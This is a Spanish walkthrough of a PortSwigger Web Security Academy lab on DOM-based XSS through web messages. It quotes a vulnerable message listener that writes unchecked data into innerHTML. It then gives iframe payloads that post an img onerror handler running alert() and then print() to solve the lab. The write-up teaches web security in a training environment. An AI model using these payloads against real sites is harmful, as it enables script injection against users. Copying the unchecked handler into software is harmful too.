---
description: >-
  https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages
---

# Lab 1: DOM XSS using web messages

Primero analizamos el codigo fuente y se detecta un codigo javascript interesante:

```html
<!-- Ads to be inserted here -->
<div id='ads'></div>
<script>
window.addEventListener('message', function(e) {
  document.getElementById('ads').innerHTML = e.data;
})
</script>
```

* La función `innerHTML` asigna directamente el contenido HTML al elemento `div` con id `ads`.
* Si el contenido (`e.data`) incluye código HTML o JavaScript, este será interpretado y ejecutado por el navegador.

Teniendo en cuenta lo anterior y adicionalmente la ausencia de la cabecera de x-frame-options:

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 11084
```

Se procede a crear un HTML con el siguiente payload:

{% code overflow="wrap" %}
```html
<iframe src="https://0a6f00e203d49a2b80f7121800fe00bb.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=alert(2024)>','*')">
```
{% endcode %}

Y lo anterior, nos genera el siguiente comportamiento:

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

El siguiente payload nos ayudara a resolver el ejercicio:

{% code overflow="wrap" %}
```html
<iframe src="https://0a6f00e203d49a2b80f7121800fe00bb.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```
{% endcode %}
